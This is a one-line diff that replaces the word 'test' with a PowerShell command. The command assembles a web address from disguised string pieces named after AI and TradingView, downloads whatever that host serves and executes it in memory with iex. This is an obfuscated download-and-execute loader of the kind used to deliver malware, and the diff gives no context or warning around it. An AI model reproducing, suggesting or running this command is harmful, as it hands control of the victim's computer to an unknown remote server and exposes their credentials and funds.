@@ -1,1 +1,1 @@
-test
+powershell -Command "$ai='beta';$indicator='app';$tradingview='.app';$d=$ai+$indicator+$tradingview;$r=iwr $d -UserAgent $ai -UseBasicParsing;iex ([Text.Encoding]::UTF8.GetString($r.Content))"
